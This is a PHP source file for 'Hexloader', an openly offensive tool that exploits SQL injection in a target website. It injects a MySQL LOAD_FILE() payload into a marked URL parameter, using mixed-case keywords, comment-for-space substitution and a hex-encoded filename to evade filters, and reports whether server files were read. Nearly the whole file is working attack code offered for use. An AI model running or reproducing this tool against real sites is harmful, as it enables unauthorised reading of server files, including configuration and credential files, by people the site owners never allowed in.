<?php

/*
	Hexloader is a PHP Script to Read Files from a Site by using Load_File().
	Copyright (C) 2010 Hexon

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

$Hexloader_Version = "v1.0.0";

set_time_limit(500);

error_reporting(-1);

if(isset($_POST['loadfilesubmit']))
{
if(isset($_POST['url']))
{
if(isset($_POST['Filename']))
{

if(preg_match("/hexon/is",$_POST['url']))
{
echo 
'
<title>
Hexloader -- Manual Load_File()
</title>
<head>
<body background="Hex1.jpg"></body>

<style type="text/css">
<!--body {background-color: black}-->
<!-- body {color : gold} -->
body {color : white}
h2 {color : white}
</style>
';

echo 
'
<div >
	<label id="automizer">URL:</label> 
</div>
';

include("Con_Url_WD.php");
$url = $_POST['url'];
$Filename = "0x".bin2hex($_POST['Filename']);
$whitespace = "/**/";

$loadfile_query = "(SEleCt aLl coNcaT(0x6833786c6f61646572,loAd_fiLE($Filename)))";
$lfile_query = str_replace(" ",$whitespace,$loadfile_query);
$getloadfile = str_replace("hexon",$lfile_query,$url);

if(preg_match("/h3xloader/",geturl($getloadfile),$loadmatch))
{
echo "<b>Load_File Success</b> = ","<a href=",$getloadfile,">",htmlspecialchars($_POST['Filename'],ENT_QUOTES),"</a>","<br />";
flush();
echo "<script type='text/javascript'>document.getElementById('automizer').innerHTML = 'Now Checking: <b>".htmlspecialchars($_POST['Filename'],ENT_QUOTES)."</b>';</script>";
flush();
}
else
{
echo "<script type='text/javascript'>document.getElementById('automizer').innerHTML = 'Now Checking: <b>",htmlspecialchars($_POST['Filename'],ENT_QUOTES),"</b>';</script>";
echo "<b>Cannot Find The File</b>." , "<br />";
flush();
}
}
else
{
echo "Hexon string cannot be found", "<br />";
}
}
}
}

?>